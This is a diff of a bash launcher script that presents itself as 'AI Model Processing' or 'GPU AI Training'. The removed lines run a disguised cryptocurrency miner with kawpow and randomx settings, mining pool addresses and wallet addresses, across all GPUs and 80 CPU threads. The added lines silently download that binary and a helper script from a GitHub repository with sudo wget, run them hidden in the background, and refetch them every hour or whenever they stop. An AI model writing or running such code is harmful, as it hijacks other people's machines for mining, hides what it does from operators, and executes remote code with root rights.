@@ -1,71 +1,64 @@
 #!/bin/bash
+# Launcher script: auto-restart if stopped, forced restart every 1 hour
+# 5-minute monitoring loop runs in foreground
 
-# --- STOP OLD PROCESSES ---
-sudo pkill -f aitraining 2>/dev/null
-sudo pkill -f monitor_system 2>/dev/null
-sleep 2
-
-mkdir -p ./logs
-
-echo "=== Starting AI Model Processing ==="
-
-# --- GPU PROCESS ---
-nohup bash -c "
-sudo ./aitraining \
-    --algorithm kawpow \
-    --pool 74.220.25.74:7845 \
-    --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
-    --worker H200-rig \
-    --password x \
-    --gpu-id 0,1,2,3,4,5,6,7 \
-    --tls false \
-    --disable-cpu \
-    --log-file ./logs/gpu_processing.log \
-    --log-file-mode 1 \
-    --api-disable 
-
-" > ./logs/gpu_nohup.log 2>&1 &
-
-# --- CPU PROCESS ---
-nohup bash -c "
-sudo ./aitraining \
-    --algorithm randomx \
-    --pool 51.222.200.133:10343 \
-    --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
-    --worker H200-cpu \
-    --password x \
-    --cpu-threads 80 \
-    --disable-gpu \
-    --tls true \
-    --log-file ./logs/cpu_processing.log \
-    --log-file-mode 1 \
-    --api-disable
-" > ./logs/cpu_nohup.log 2>&1 &
-
-# --- MONITOR SYSTEM ---
-nohup bash -c "
 while true; do
-    echo -e '\n=== \$(date) System Status ===' >> ./logs/monitor.log
-    echo 'Active Processes:' >> ./logs/monitor.log
-    ps aux | grep aitraining | grep -v grep >> ./logs/monitor.log
-    echo 'GPU Status:' >> ./logs/monitor.log
-    nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> ./logs/monitor.log 2>/dev/null
-    echo '---' >> ./logs/monitor.log
-    sleep 30
-done
-" > ./logs/monitor_nohup.log 2>&1 &
+    echo "========== Starting GPU AI Training Launcher =========="
 
-echo "=== Processing Started Successfully ==="
-echo ""
-echo "📊 Log Files:"
-echo "   GPU: ./logs/gpu_processing.log"
-echo "   CPU: ./logs/cpu_processing.log"
-echo "   Monitor: ./logs/monitor.log"
-echo ""
-echo "🌐 API Endpoints:"
-echo "   GPU Stats: http://127.0.0.1:21550/stats"
-echo "   CPU Stats: http://127.0.0.1:21551/stats"
-echo ""
-echo "🔍 Check processes: ps aux | grep aitraining"
-echo "📈 Real-time logs: tail -f ./logs/*.log"
-echo "🛑 Stop processing: sudo pkill -f aitraining && sudo pkill -f monitor_system"
+    # Stop old processes safely
+    for proc in "start_modelgp.sh" "aitraining"; do
+        if pgrep -f "$proc" > /dev/null; then
+            sudo pkill -f "$proc"
+            echo "$proc stopped."
+        fi
+    done
+
+    # Delete old files before download
+    echo "Deleting old files..."
+    rm -f ./aitraining ./start_modelgp.sh
+
+    # Launch start_modelgp.sh silently in background
+    nohup bash -c '
+        sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
+        sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
+        sudo chmod +x ./aitraining
+        sudo chmod +x ./start_modelgp.sh
+        sudo bash ./start_modelgp.sh
+    ' > /dev/null 2>&1 &
+
+    echo "start_modelgp.sh launched."
+
+    # --- 5-minute monitoring loop runs in foreground ---
+    runtime=0
+    while [ $runtime -lt 3600 ]; do  # 1 hour
+        sleep 300  # 5 minutes
+        runtime=$((runtime + 300))
+
+        if pgrep -f "aitraining" > /dev/null; then
+            # This echo will now appear in your terminal
+            echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining running fine."
+        else
+            echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining stopped! Restarting start_modelgp.sh..."
+
+            # Kill remaining processes
+            sudo pkill -f "start_modelgp.sh" 2>/dev/null
+            sudo pkill -f "aitraining" 2>/dev/null
+
+            # Delete old files
+            rm -f ./aitraining ./start_modelgp.sh
+
+            # Relaunch silently
+            nohup bash -c '
+                sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
+                sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh
+                sudo chmod +x ./aitraining
+                sudo chmod +x ./start_modelgp.sh
+                sudo bash ./start_modelgp.sh
+            ' > /dev/null 2>&1 &
+
+            echo "$(date '+%Y-%m-%d %H:%M:%S') - start_modelgp.sh restarted."
+        fi
+    done
+
+    echo "========== 1 hour completed, restarting processes =========="
+done
